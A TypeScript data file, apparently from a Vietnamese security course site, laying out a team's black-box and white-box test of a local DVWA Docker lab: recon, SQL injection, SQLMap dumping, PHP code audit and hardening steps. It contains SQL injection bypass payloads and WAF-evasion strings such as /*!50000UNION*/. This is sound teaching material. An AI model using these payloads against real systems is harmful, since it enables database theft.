import {
  AttackStage,
  CodeComparison4Row,
  CvssMetricDetail,
  DefenseLayerItem,
  EngineeringShiftRow,
  LabMaintenanceCmd,
  LabWorkspaceState,
  QaItem,
  ScenarioStep,
  StepEnrichment,
  TeamMember,
  VulnerabilityItem,
} from "@/types/scenario";

export const PROJECT_OVERVIEW = {
  courseTitle: "Học phần: Kiểm thử & An toàn Hệ thống Web (ATTT)",
  projectTitle: "Kiểm thử Hộp đen (Black-Box) & Kiểm toán Hộp trắng (White-Box) Hệ thống Web DVWA",
  subtitle:
    "Mô phỏng quy trình kiểm thử xâm nhập (Black-Box), kiểm toán mã nguồn & cơ sở dữ liệu (White-Box) và triển khai các giải pháp phòng thủ chiều sâu trên hệ thống mục tiêu DVWA, chia rõ từng bước thực hành cho 4 thành viên.",
  targetSystem: "Damn Vulnerable Web Application (DVWA) — Docker image vulnerables/web-dvwa (Apache/2.4.25 Debian + PHP + MariaDB)",
  methodology: "PTES (Penetration Testing Execution Standard) + White-Box Source/DB Audit + Defense-in-Depth (OWASP Top 10 A03:2021 - Injection)",
  recordedDate: "04/11/2026",
  toolkit: [
    {
      name: "Docker (DVWA)",
      role: "Máy chủ Mục tiêu (Target Server)",
      config: "Container ID: 215d3a734374 hoặc --name dvwa | 0.0.0.0:8080->80/tcp",
      outcome: "Vận hành Apache/2.4.25 (Debian) + PHP + MariaDB cô lập 100%",
    },
    {
      name: "Nmap & cURL + grep",
      role: "Trinh sát & Tự động bóc tách CLI",
      config: "Terminal (zsh / bash)",
      outcome: "Quét cổng 8080, thu thập HTTP Header (PoC 1) & lọc HTML bằng regex (PoC 2)",
    },
    {
      name: "Burp Suite Community",
      role: "Trạm Đánh chặn & Thao túng Gói tin",
      config: "Proxy Listener: 127.0.0.1:8081 | Định tuyến: localtest.me:8080",
      outcome: "Bắt gói HTTP GET, trích PHPSESSID, kiểm chứng lỗi & bản vá (PoC 2 & 5)",
    },
    {
      name: "SQLMap & MariaDB CLI",
      role: "Khai thác Tự động & Kiểm toán Hộp trắng",
      config: "sqlmap (--batch) + docker exec mysql/php",
      outcome: "Dump CSDL, bẻ khóa MD5, vá Bcrypt, phân quyền DB & kiểm toán PHP (PoC 3 & 4)",
    },
  ],
};

export const INFRA_CHALLENGES = [
  {
    id: "port-conflict",
    title: "1. Xử lý Xung đột Cổng (Port Conflict 8080 vs 8081)",
    problem:
      "Container Docker DVWA đã chiếm dụng cổng 8080 (0.0.0.0:8080->80/tcp), khiến Proxy mặc định của Burp Suite (cũng dùng 8080) không thể khởi động song song.",
    solution:
      "Chuyển Proxy Listener của Burp Suite sang 127.0.0.1:8081 (Proxy -> Proxy settings) để trạm đánh chặn và máy chủ web chạy đồng thời không xung đột.",
  },
  {
    id: "loopback-bypass",
    title: "2. Vượt Cơ chế Loopback Bypass của Trình duyệt Chromium",
    problem:
      "Trình duyệt tích hợp trong Burp Suite (Chromium) mặc định bỏ qua Proxy đối với lưu lượng gửi tới 127.0.0.1 hoặc localhost, làm tab Proxy Intercept không bắt được gói tin.",
    solution:
      "Sử dụng tên miền phân giải nội bộ http://localtest.me:8080 (trỏ về 127.0.0.1) để buộc trình duyệt định tuyến 100% gói tin HTTP đi qua Proxy Burp Suite ở cổng 8081.",
  },
];

export const ATTACK_FLOW_STAGES: AttackStage[] = [
  {
    stage: 1,
    badge: "GIAI ĐOẠN 1 • TRINH SÁT & HẠ TẦNG",
    title: "Setup Lab Docker & Trinh sát Bề mặt (PoC 1)",
    owner_member: 1,
    tools: "Docker CLI, Nmap, cURL",
    action: "Kiểm tra container DVWA, quét dịch vụ cổng 8080 bằng Nmap (-sV) và thu thập HTTP Header qua cURL.",
    output: "Phát hiện Server: Apache/2.4.25 (Debian) (CWE-200) và Cookie PHPSESSID / security=low thiếu HttpOnly, SameSite=Strict (CWE-614).",
    handoff: "Chuyển sang máy kiểm thử mở trình duyệt qua cổng Proxy 8081 với localtest.me:8080.",
    poc_label: "PoC 1 + Vá Apache Banner",
  },
  {
    stage: 2,
    badge: "GIAI ĐOẠN 2 • ĐÁNH CHẶN & KHAI THÁC THỦ CÔNG",
    title: "Burp Suite Repeater, cURL + grep & Log Forensics (PoC 2)",
    owner_member: 2,
    tools: "Burp Suite Community, cURL + grep, Apache access.log",
    action: "Đánh chặn GET /vulnerabilities/sqli/, chèn payload ' và ' OR '1'='1 trên Repeater, trích PHPSESSID đưa vào cURL + grep.",
    output: "MariaDB báo lỗi cú pháp You have an error in your SQL syntax... near '''1''' (CWE-89, CVSS 8.8), bóc tách được First name: admin và truy vết IoC trong access.log.",
    handoff: "Nạp URL mục tiêu + chuỗi Cookie PHPSESSID vào SQLMap để tự động hóa khai thác.",
    poc_label: "PoC 2 + Log Forensics",
  },
  {
    stage: 3,
    badge: "GIAI ĐOẠN 3 • KHAI THÁC TỰ ĐỘNG & KIỂM TOÁN CSDL",
    title: "SQLMap 3 Lệnh, MariaDB CLI & Vá Mật mã học (PoC 3)",
    owner_member: 3,
    tools: "SQLMap, MariaDB CLI (mysql), PHP CLI",
    action: "Chạy chuỗi 3 lệnh SQLMap (--dbs, --tables, --dump), kiểm toán bảng users bằng mysql root, vá Bcrypt và tạo user dvwa_svc.",
    output: "Phát hiện 5 tài khoản băm MD5 không Salt (admin và smithy trùng 5f4dcc3b5aa765d61d8327deb882cf99 -> password, CWE-759). Nâng cấp sang Bcrypt cost=12 & Least Privilege.",
    handoff: "Đi sâu kiểm toán mã nguồn PHP 4 cấp độ để tìm nguyên nhân gốc rễ và kiểm chứng bản vá.",
    poc_label: "PoC 3 + Bcrypt & Least Privilege",
  },
  {
    stage: 4,
    badge: "GIAI ĐOẠN 4 • KIỂM TOÁN CODE, BẢN VÁ & WAF",
    title: "Code PHP 4 Cấp, Kiểm chứng PoC 5 & Luật WAF (PoC 4 & 5)",
    owner_member: 4,
    tools: "Docker cat -n, Burp Suite Repeater, ModSecurity CRS",
    action: "So sánh low.php, medium.php, high.php, impossible.php; test PoC 5 gốc (302 Found) và PoC 5 tinh chỉnh (có user_token); cấu hình SecRule WAF.",
    output: "Chứng minh cơ chế bảo vệ 3 lớp của impossible.php (checkToken + is_numeric + PDO Prepared Statements) vô hiệu hóa 100% SQLi và chặn tầng biên bằng HTTP 403.",
    handoff: "Hoàn thiện Hồ sơ Kiểm toán & Phòng ngự Chiều sâu (Defense-in-Depth).",
    poc_label: "PoC 4, PoC 5 + WAF Rule",
  },
];

export const CODE_COMPARISON_TABLE = [
  {
    criterion: "Thư viện kết nối CSDL",
    low: "mysqli (Gọi hàm thủ tục truyền thống)",
    impossible: "PDO (PHP Data Objects hướng đối tượng)",
  },
  {
    criterion: "Cách xử lý tham số $id",
    low: "Nối chuỗi trực tiếp: \"...WHERE user_id = '$id'\" (Dòng 8)",
    impossible: "Tham số hóa với Placeholder: \"...WHERE user_id = (:id)\" (Dòng 13)",
  },
  {
    criterion: "Kiểm tra kiểu dữ liệu",
    low: "Không kiểm tra (Chấp nhận mọi chuỗi ký tự từ $_REQUEST)",
    impossible: "Kiểm tra kép bằng is_numeric($id) (Dòng 11) và ép kiểu PDO::PARAM_INT (Dòng 14)",
  },
  {
    criterion: "Bảo vệ chống CSRF",
    low: "Không có",
    impossible: "Kiểm tra nghiêm ngặt qua hàm checkToken() (Dòng 5), trả về 302 Found nếu vi phạm",
  },
  {
    criterion: "Xử lý lỗi (Error Handling)",
    low: "In thẳng lỗi MariaDB ra màn hình qua mysqli_error() (Dòng 9)",
    impossible: "Ẩn hoàn toàn lỗi hệ thống, không tiết lộ cấu trúc bảng",
  },
  {
    criterion: "Khả năng chống SQLi",
    low: "0% (Bị bẻ gãy cấu trúc truy vấn)",
    impossible: "100% (Tách biệt hoàn toàn Lệnh và Dữ liệu)",
  },
];

export const PHP_LEVEL_SOURCES = [
  {
    level: "low",
    title: "low.php — Nối chuỗi trực tiếp (Lỗ hổng 100%)",
    badge: "0% An toàn • CWE-89",
    severity: "critical" as const,
    summary:
      "Nhận thẳng $_REQUEST['id'] (dòng 5), ghép trực tiếp vào chuỗi SQL WHERE user_id = '$id' (dòng 8) và xuất thẳng lỗi MariaDB bằng mysqli_error() (dòng 9).",
    code: ` 3  if( isset( $_REQUEST[ 'Submit' ] ) ) {
 4      // Get input
 5      $id = $_REQUEST[ 'id' ];
 6
 7      // Check database
 8      $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
 9      $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );`,
    highlightLines: [5, 8, 9],
    bypassDemo: "Payload: 1' OR '1'='1  -->  SELECT ... WHERE user_id = '1' OR '1'='1';",
  },
  {
    level: "medium",
    title: "medium.php — Sanitization vô hiệu do thiếu dấu nháy",
    badge: "Bị bypass • Lỗi kiến trúc",
    severity: "high" as const,
    summary:
      "Dùng mysqli_real_escape_string() để thoát dấu nháy đơn trên $_POST['id'], nhưng câu truy vấn viết WHERE user_id = $id không có dấu nháy bao quanh. SQL coi $id là biểu thức số học, làm hàm lọc dấu nháy trở nên vô hiệu.",
    code: `// Trich doan phan tich kien truc medium.php
$id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $_POST['id']);
$query = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
$result = mysqli_query($GLOBALS["___mysqli_ston"], $query);`,
    highlightLines: [2, 3],
    bypassDemo: "Payload không cần dấu nháy: 1 OR 1=1  -->  WHERE user_id = 1 OR 1=1;",
  },
  {
    level: "high",
    title: "high.php — Bảo vệ giao diện giả tạo (Trust Boundary)",
    badge: "Bị bypass • Trust Boundary",
    severity: "medium" as const,
    summary:
      "Tách bước nhập liệu qua cửa sổ popup và lưu vào $_SESSION['id'], đồng thời thêm LIMIT 1 ở cuối truy vấn. Tuy nhiên vẫn vi phạm ranh giới tin cậy (Trust Boundary) vì nối chuỗi trực tiếp và LIMIT 1 dễ bị vô hiệu bằng ký tự chú thích # hoặc --.",
    code: `// Co che luu tru phien va ghep chuoi trong high.php
$id = $_SESSION['id'];
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
$result = mysqli_query($GLOBALS["___mysqli_ston"], $query);`,
    highlightLines: [2, 3],
    bypassDemo: "Payload: ' OR '1'='1' #  -->  cắt bỏ LIMIT 1 ở phía sau.",
  },
  {
    level: "impossible",
    title: "impossible.php — Phòng thủ 3 lớp & PDO Prepared Statements",
    badge: "100% An toàn • Chuẩn OWASP",
    severity: "safe" as const,
    summary:
      "Chặn đứng SQL Injection bằng 3 lớp: (1) checkToken() chống CSRF ở dòng 5, (2) is_numeric($id) xác thực kiểu số ở dòng 11, (3) PDO prepare() + bindParam(':id', $id, PDO::PARAM_INT) ở dòng 13–15 tách biệt hoàn toàn giai đoạn biên dịch SQL và nạp dữ liệu.",
    code: ` 3  if( isset( $_GET[ 'Submit' ] ) ) {
 4      // Check Anti-CSRF token
 5      checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
 6
 7      // Get input
 8      $id = $_GET[ 'id' ];
 9
10      // Was a number entered?
11      if(is_numeric( $id )) {
12          // Check the database
13          $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
14          $data->bindParam( ':id', $id, PDO::PARAM_INT );
15          $data->execute();`,
    highlightLines: [5, 11, 13, 14, 15],
    bypassDemo: "Payload 1' với token hợp lệ -> is_numeric(\"1'\") === false -> không chạm tới CSDL!",
  },
];

export const TEAM_MEMBERS: TeamMember[] = [
  {
    member_number: 1,
    slug: "1",
    display_name: "Sơn",
    role_title: "Kiến trúc Container Cô lập, Trinh sát (PoC 1) & DevSecOps Security Gate",
    device: "MacBook (macOS Apple Silicon)",
    os_env: "macOS Terminal (zsh) + Docker Desktop + Python 3",
    stage_label: "Giai đoạn 1 • Trinh sát, Hardening & CI/CD Gate",
    main_practice: "Docker --read-only/--cap-drop=ALL, Nmap/cURL (PoC 1) & son_sec_gate.py",
    defense_scope:
      "Vá Apache Banner (CWE-200), Cookie/CSP Security Headers (CWE-614), Chặn ghi Webshell bằng ReadonlyRootfs & Security Gate tự động",
    overview_summary:
      "Thiết lập lab DVWA cô lập, thực hành Nmap/cURL (PoC 1) và vá Apache/Cookie. Ở tầng Kỹ sư: tái cấu trúc Container sang Read-Only RootFS + Drop ALL Capabilities để triệt tiêu RCE ghi Webshell (INTO OUTFILE) và viết công cụ son_sec_gate.py chấm điểm bảo mật tự động (Exit 0/1) trong CI/CD.",
    tools: [
      "Docker CIS Hardening (--read-only, --cap-drop=ALL)",
      "son_sec_gate.py (DAST + Container Gate)",
      "Nmap & cURL (PoC 1)",
      "Apache security.conf & CSP",
    ],
    accent_theme: "cyan",
  },
  {
    member_number: 2,
    slug: "2",
    display_name: "Hùng",
    role_title: "Đánh chặn Burp (PoC 2), Thuật toán Binary-Search Blind SQLi & IDS Entropy",
    device: "Laptop Windows 1 (Ubuntu VM)",
    os_env: "Ubuntu Terminal + Burp Suite Community + Python 3",
    stage_label: "Giai đoạn 2 • Khai thác Thuật toán & IDS Forensics",
    main_practice: "Burp Repeater (PoC 2), hung_blind_bisect.py O(log2 N) & Shannon Entropy IDS",
    defense_scope:
      "Điều tra Log access.log & Mô hình phát hiện xâm nhập toán học dựa trên Entropy H(X) và Z-Score kích thước phản hồi",
    overview_summary:
      "Xử lý xung đột cổng 8080/8081 và Loopback Bypass, thực hành Burp Repeater & cURL+grep (PoC 2). Ở tầng Kỹ sư: tự viết script hung_blind_bisect.py áp dụng tìm kiếm nhị phân O(log2 N) trích xuất Blind SQLi giảm ~85% request và bộ phát hiện bất thường Log theo Shannon Entropy H(X) & Z-Score.",
    tools: [
      "hung_blind_bisect.py (O(log2 N) + Entropy IDS)",
      "Burp Suite Community (Proxy 8081)",
      "cURL + grep (PoC 2)",
      "Apache access.log Forensics",
    ],
    accent_theme: "amber",
  },
  {
    member_number: 3,
    slug: "3",
    display_name: "Quyết",
    role_title: "SQLMap (PoC 3), Di trú Zero-Downtime Dual-Hash, Least-Privilege View & Canary",
    device: "Laptop Windows 2 (Ubuntu VM)",
    os_env: "Ubuntu Terminal + SQLMap + MariaDB & PHP CLI",
    stage_label: "Giai đoạn 3 • Di trú CSDL & Phòng thủ Canary",
    main_practice: "SQLMap 3 pha (PoC 3), Zero-Downtime Dual-Hash & Honeypot Canary Trap",
    defense_scope:
      "Chuyển đổi MD5 -> Bcrypt không gián đoạn (Lazy Upgrade), Cô lập cột nhạy cảm bằng SQL View & Bẫy Canary user_id=0",
    overview_summary:
      "Thực thi SQLMap --dbs/--tables/--dump và kiểm toán bảng users (PoC 3). Ở tầng Kỹ sư: thiết kế quy trình di trú Zero-Downtime (Dual-Hash Verify + Lazy Upgrade qua Stored Procedure DEFINER), ẩn cột password bằng SQL View v_user_public_profile và cài dòng bẫy Canary user_id=0 phát hiện dump trái phép tức thì.",
    tools: [
      "quyet_zero_downtime_migration.sql",
      "SQL View + Column REVOKE/GRANT",
      "Canary Honeypot (user_id=0)",
      "SQLMap + MariaDB CLI (PoC 3)",
    ],
    accent_theme: "emerald",
  },
  {
    member_number: 4,
    slug: "4",
    display_name: "Khánh",
    role_title: "Kiểm toán PHP (PoC 4), RASP SQL Lexical Tokenizer (Chống Bypass) & WAF CRS",
    device: "Laptop Windows 3 (Ubuntu VM)",
    os_env: "Ubuntu Terminal + Burp Repeater + ModSecurity + Python 3",
    stage_label: "Giai đoạn 4 • Code Audit, Tokenizer RASP & WAF",
    main_practice: "PHP 4 cấp (PoC 4), khanh_sql_lexer_waf.py (Tokenizer) & SafePDO/WAF (PoC 5)",
    defense_scope:
      "Vượt qua giới hạn Regex bằng Bộ phân tích từ vựng SQL (Lexical Tokenizer chuẩn libinjection) & Khóa chết 3 lớp PDO + CSRF + CSP",
    overview_summary:
      "Phân tích 4 cấp độ PHP (PoC 4), kiểm chứng PoC 5 + ModSecurity SecRule. Ở tầng Kỹ sư: chứng minh biểu thức Regex ngây thơ bị vượt mặt bởi /*!50000UNION*/ hay %2527 đồng thời chặn nhầm họ tên \"O'Connor\", từ đó tự xây dựng Bộ phân tích từ vựng SQL khanh_sql_lexer_waf.py kèm SafePDO chuẩn hóa kiến trúc.",
    tools: [
      "khanh_sql_lexer_waf.py (SQL Tokenizer RASP)",
      "Adversarial Regex Bypass Benchmarks",
      "SafePDO + is_numeric + user_token (PoC 5)",
      "ModSecurity CRS SecRule 100001",
    ],
    accent_theme: "violet",
  },
];

export const ENGINEERING_MINDSET_MATRIX: EngineeringShiftRow[] = [
  {
    memberNumber: 1,
    memberName: "Sơn",
    roleTitle: "Infra Security & DevSecOps Gate",
    toolUserBaseline: "Chạy docker run mặc định, gõ curl -Is thủ công xem Header bằng mắt rồi sửa file Apache lẻ tẻ.",
    engineerUpgrade:
      "Thiết kế Container bất biến (--read-only --cap-drop=ALL) chặn ghi Webshell INTO OUTFILE dù app lỗi SQLi, kèm script CI/CD tự chấm điểm bảo mật (Exit 0/1).",
    customArtifact: "son_sec_gate.py",
    artifactHref: "/engineering/son_sec_gate.py",
    workbenchHref: "/mo-phong?member=1&tab=eng",
    verifiedMetric: "Chặn 100% Webshell Write | Chấm điểm 10 hạng mục CIS + HTTP",
  },
  {
    memberNumber: 2,
    memberName: "Hùng",
    roleTitle: "Algorithmic Exploitation & IDS Math",
    toolUserBaseline: "Gửi ' UNION lặp lại công thức mẫu trong Burp Repeater hoặc chạy tuần tự brute-force dò từng ký tự.",
    engineerUpgrade:
      "Tự cài đặt thuật toán Tìm kiếm Nhị phân O(log2 N) bóc tách Blind SQLi (~7 req/ký tự, giảm 85% request) & bộ phát hiện Log IDS bằng Shannon Entropy H(X) + Z-Score.",
    customArtifact: "hung_blind_bisect.py",
    artifactHref: "/engineering/hung_blind_bisect.py",
    workbenchHref: "/mo-phong?member=2&tab=eng",
    verifiedMetric: "Giảm ~85% số HTTP Request | Phát hiện Entropy H >= 4.2 bits",
  },
  {
    memberNumber: 3,
    memberName: "Quyết",
    roleTitle: "Database Security & Zero-Downtime",
    toolUserBaseline: "Chạy 3 lệnh SQLMap có sẵn rồi UPDATE password=MD5 sang Bcrypt cho 1 dòng admin (gây sập đăng nhập người dùng cũ ngoài thực tế).",
    engineerUpgrade:
      "Di trú Dual-Hash Lazy Upgrade không gián đoạn qua Stored Procedure DEFINER, che giấu cột nhạy cảm bằng SQL View v_user_public_profile & đặt Bẫy Canary user_id=0.",
    customArtifact: "quyet_zero_downtime_migration.sql",
    artifactHref: "/engineering/quyet_zero_downtime_migration.sql",
    workbenchHref: "/mo-phong?member=3&tab=eng",
    verifiedMetric: "0s Downtime Migration | Bắt 100% Full-Table Dump qua Canary Trap",
  },
  {
    memberNumber: 4,
    memberName: "Khánh",
    roleTitle: "RASP Lexical WAF & SafePDO",
    toolUserBaseline: "Dán 1 luật Regex SecRule đơn giản hoặc chỉ đọc diff low.php vs impossible.php có sẵn của DVWA.",
    engineerUpgrade:
      "Chứng minh Regex WAF bị vượt bởi /*!50000UNION*/, %2527 và chặn nhầm 'O'Connor', từ đó lập trình bộ phân tích từ vựng SQL Tokenizer theo cấu trúc ngữ pháp + SafePDO.",
    customArtifact: "khanh_sql_lexer_waf.py",
    artifactHref: "/engineering/khanh_sql_lexer_waf.py",
    workbenchHref: "/mo-phong?member=4&tab=eng",
    verifiedMetric: "0% False Positive ('O'Connor') | Chặn Obfuscation & Double-Encode",
  },
];

export const SCENARIO_STEPS: ScenarioStep[] = [
  // ==================== NGUOI 1 ====================
  {
    id: "m1-s1",
    member_number: 1,
    step_order: 1,
    phase_tag: "PHẦN CHÍNH • TRINH SÁT HẠ TẦNG",
    title: "Kiểm tra Hạ tầng Lab Docker & Quét Dịch vụ Mục tiêu bằng Nmap",
    poc_ref: "Hạ tầng • Nmap",
    is_defense: false,
    goal: "Xác nhận container DVWA đang hoạt động ổn định trên cổng 8080 và dùng Nmap (-sV) dò tìm phiên bản dịch vụ Web đang mở trước khi kiểm thử.",
    action_steps: [
      "Mở Terminal (zsh) và đảm bảo Docker Desktop đang chạy container mục tiêu DVWA (ID: 215d3a734374, tên ngẫu nhiên epic_dijkstra).",
      "Gõ lệnh docker ps để kiểm tra trạng thái Up và ánh xạ cổng 0.0.0.0:8080->80/tcp.",
      "Gõ lệnh nmap -sV -p 8080 127.0.0.1 để quét đúng cổng 8080 và xác định banner dịch vụ (Apache httpd).",
      "Nếu chưa cài Nmap trên macOS, cài nhanh bằng lệnh: brew install nmap.",
    ],
    commands: [
      {
        label: "Kiểm tra Container DVWA & Quét cổng bằng Nmap",
        shell: "zsh / bash",
        template: `docker ps
nmap -sV -p 8080 127.0.0.1`,
        explanation:
          "Tham số -sV dò phiên bản dịch vụ đang lắng nghe; -p 8080 giới hạn chỉ quét vào cổng web mục tiêu để tiết kiệm thời gian.",
      },
    ],
    expected_output: `CONTAINER ID   IMAGE                  COMMAND      STATUS       PORTS                    NAMES
215d3a734374   vulnerables/web-dvwa   "/main.sh"   Up 2 hours   0.0.0.0:8080->80/tcp     epic_dijkstra

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.25 ((Debian))`,
    academic_explanation:
      "Theo chuẩn PTES (Giai đoạn 1 - Reconnaissance), kiểm thử viên không tấn công mù quáng mà phải xác định chính xác bề mặt dịch vụ (Attack Surface) và công nghệ nền tảng.",
    presenter_script:
      "Quy trình kiểm thử bắt đầu theo chuẩn PTES kết hợp Black-box và White-box trên môi trường Lab Docker cô lập. Bước đầu tiên xác nhận container DVWA đang mở cổng 8080 và dùng Nmap ghi nhận dịch vụ Apache httpd.",
    simulator_key: "m1-recon",
  },
  {
    id: "m1-s2",
    member_number: 1,
    step_order: 2,
    phase_tag: "PHẦN CHÍNH • POC 1",
    title: "Thu thập HTTP Header qua cURL — Phát hiện Lộ Banner & Cookie thiếu cờ",
    poc_ref: "PoC 1 • cURL",
    is_defense: false,
    goal: "Thu thập 15 dòng đầu của phản hồi HTTP từ login.php để phát hiện 2 lỗ hổng bề mặt đầu tiên (PoC 1).",
    action_steps: [
      "Chạy lệnh curl -is http://127.0.0.1:8080/login.php | head -n 15 trên Terminal.",
      "Quan sát dòng Server: để chỉ ra lỗi Server Banner Disclosure (tiết lộ chính xác Apache/2.4.25 và hệ điều hành Debian).",
      "Quan sát 2 dòng Set-Cookie: để chỉ ra PHPSESSID và security=low không có cờ bảo vệ HttpOnly hay SameSite=Strict, đồng thời lưu trạng thái bảo mật ngay phía Client.",
    ],
    commands: [
      {
        label: "Thu thập 15 dòng Header đầu tiên (PoC 1)",
        shell: "zsh / bash",
        template: `curl -is http://127.0.0.1:8080/login.php | head -n 15`,
        explanation:
          "Cờ -i hiển thị HTTP response headers cùng nội dung; -s tắt thanh tiến trình; head -n 15 cắt gọn phần header để lấy bằng chứng báo cáo.",
      },
    ],
    expected_output: `HTTP/1.1 200 OK
Date: Wed, 04 Nov 2026 02:09:19 GMT
Server: Apache/2.4.25 (Debian)
Set-Cookie: PHPSESSID=2d0vvd715drf3nv8mgq7vderg6; path=/
Expires: Tue, 23 Jun 2009 12:00:00 GMT
Cache-Control: no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: security=low
Content-Type: text/html;charset=utf-8`,
    academic_explanation:
      "Phát hiện 2 điểm yếu theo chuẩn quốc tế: (1) Server Banner Disclosure — CWE-200 (CVSS v3.1: 5.3 Medium) giúp kẻ tấn công tra cứu CVE của Apache 2.4.25; (2) Cookie thiếu cờ HttpOnly / SameSite=Strict — CWE-614 (CVSS v3.1: 4.2 Medium) và Client-side Security State (security=low).",
    presenter_script:
      "Qua kết quả PoC 1 từ cURL, hệ thống lộ rõ Server: Apache/2.4.25 (Debian) — mã CWE-200 với điểm CVSS 5.3; đồng thời cấp phát cookie PHPSESSID và security=low thiếu cờ HttpOnly và SameSite=Strict — mã CWE-614, CVSS 4.2.",
    simulator_key: "m1-recon",
  },
  {
    id: "m1-s3",
    member_number: 1,
    step_order: 3,
    phase_tag: "GIA CỐ & PHÒNG THỦ • LIVE PATCHING",
    title: "Vá lỗi 3 Trực tiếp — Gia cố Cấu hình Apache để Ẩn Banner Phiên bản",
    poc_ref: "Vá lỗi 3 • Apache",
    is_defense: true,
    goal: "Chuyển kiến nghị bảo mật thành hành động vá trực tiếp trên container đang chạy, ẩn hoàn toàn số phiên bản 2.4.25 và hệ điều hành Debian.",
    action_steps: [
      "Thực thi lệnh docker exec nối thêm hai chỉ thị ServerTokens Prod và ServerSignature Off vào file /etc/apache2/conf-available/security.conf.",
      "Kích hoạt cấu hình bằng a2enconf security và tải lại dịch vụ Apache (service apache2 reload) không làm gián đoạn container.",
      "Chạy lại curl -Is http://127.0.0.1:8080/login.php | grep -i \"Server:\" để kiểm chứng sau khi vá.",
      "Đối chiếu kết quả: dòng Server chỉ còn hiển thị duy nhất 'Server: Apache'.",
    ],
    commands: [
      {
        label: "Live Patching cấu hình Apache security.conf",
        shell: "zsh / bash",
        template: `docker exec -it {{CONTAINER}} bash -c "cat << 'EOF' >> /etc/apache2/conf-available/security.conf
ServerTokens Prod
ServerSignature Off
EOF
a2enconf security && service apache2 reload"`,
        explanation:
          "ServerTokens Prod ép Apache chỉ trả về tên phần mềm 'Apache' trong HTTP header; ServerSignature Off tắt chữ ký phiên bản ở các trang lỗi 404/500.",
      },
      {
        label: "Kiểm chứng lại HTTP Header sau khi vá",
        shell: "zsh / bash",
        template: `curl -Is http://127.0.0.1:8080/login.php | grep -i "Server:"`,
        explanation: "Chỉ lấy HTTP header (-I) và lọc dòng Server: để xác minh bản vá có hiệu lực ngay lập tức.",
      },
    ],
    expected_output: `Enabling conf security.
Reloading Apache httpd web server: apache2.

Server: Apache`,
    academic_explanation:
      "Thay vì chỉ đề xuất lý thuyết, quá trình gia cố trực tiếp (Live Hardening) trên container giúp triệt tiêu hoàn toàn thông tin phiên bản 2.4.25 và OS Debian trước khi chuyển sang Giai đoạn 2.",
    presenter_script:
      "Để khắc phục ngay lỗ hổng rò rỉ thông tin máy chủ, cấu hình security.conf bên trong container được bổ sung ServerTokens Prod và ServerSignature Off. Khi kiểm tra lại bằng cURL, phản hồi chỉ còn duy nhất 'Server: Apache'.",
    simulator_key: "m1-patch",
  },
  {
    id: "m1-s4",
    member_number: 1,
    step_order: 4,
    phase_tag: "GIA CỐ & PHÒNG THỦ • COOKIE & SECURITY HEADERS",
    title: "Vá lỗi 4 Trực tiếp — Gia cố Cờ Cookie (HttpOnly, SameSite) & HTTP Security Headers",
    poc_ref: "Vá lỗi 4 • CWE-614",
    is_defense: true,
    goal: "Khắc phục điểm yếu thứ hai phát hiện tại PoC 1 (CWE-614, CVSS 4.2): kích hoạt mod_headers của Apache để tự động gắn cờ HttpOnly, SameSite=Strict cho Cookie phiên và bổ sung header chống MIME-Sniffing, Clickjacking.",
    action_steps: [
      "Bật module headers của Apache bên trong container bằng lệnh a2enmod headers.",
      "Nối cấu hình Header edit Set-Cookie (thêm HttpOnly; SameSite=Strict) cùng 2 chỉ thị X-Content-Type-Options: nosniff và X-Frame-Options: SAMEORIGIN vào /etc/apache2/conf-available/security.conf.",
      "Tải lại dịch vụ Apache (service apache2 reload) để áp dụng chính sách header mới mà không làm gián đoạn phiên.",
      "Chạy cURL kiểm tra lại phản hồi từ login.php để xác nhận cả 2 lỗ hổng CWE-200 và CWE-614 của Giai đoạn 1 đều đã được xử lý triệt để.",
    ],
    commands: [
      {
        label: "Bật mod_headers & Gia cố cờ Cookie + Security Headers",
        shell: "zsh / bash",
        template: `docker exec -it {{CONTAINER}} bash -c "a2enmod headers && cat << 'EOF' >> /etc/apache2/conf-available/security.conf
Header edit Set-Cookie ^(.*)$ \\"\\$1; HttpOnly; SameSite=Strict\\"
Header always set X-Content-Type-Options \\"nosniff\\"
Header always set X-Frame-Options \\"SAMEORIGIN\\"
EOF
service apache2 reload"`,
        explanation:
          "HttpOnly ngăn JavaScript đọc trộm PHPSESSID khi có XSS; SameSite=Strict chặn trình duyệt tự gửi cookie kèm request giả mạo liên trang (CSRF); nosniff và SAMEORIGIN bảo vệ trình duyệt khỏi MIME-Sniffing và Clickjacking.",
      },
      {
        label: "Kiểm chứng tổng thể HTTP Header sau khi hoàn tất 2 bản vá",
        shell: "zsh / bash",
        template: `curl -Is http://127.0.0.1:8080/login.php | grep -iE "(Server:|Set-Cookie:|X-Content-Type|X-Frame)"`,
        explanation:
          "Lọc đồng thời dòng Server, Set-Cookie và các Security Headers để lấy bằng chứng đối chứng hoàn chỉnh sau Giai đoạn 1.",
      },
    ],
    expected_output: `Enabling module headers.
Reloading Apache httpd web server: apache2.

Server: Apache
Set-Cookie: PHPSESSID=2d0vvd715drf3nv8mgq7vderg6; path=/; HttpOnly; SameSite=Strict
Set-Cookie: security=low; HttpOnly; SameSite=Strict
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN`,
    academic_explanation:
      "Khắc phục trực tiếp CWE-614 (CVSS 4.2 Medium) và củng cố chuẩn OWASP A05:2021 (Security Misconfiguration). Dù kẻ tấn công chèn được kịch bản phía client, cờ HttpOnly vẫn khóa chặt quyền truy cập document.cookie đối với PHPSESSID.",
    presenter_script:
      "Sau khi đã ẩn Banner máy chủ ở Bước 3, Bước 4 xử lý nốt lỗ hổng thứ hai của PoC 1 bằng cách bật mod_headers trên Apache, ép mọi Cookie cấp phát đều mang cờ HttpOnly và SameSite=Strict, đồng thời bổ sung X-Frame-Options và X-Content-Type-Options.",
    simulator_key: "m1-patch",
  },

  // ==================== NGUOI 2 ====================
  {
    id: "m2-s1",
    member_number: 2,
    step_order: 1,
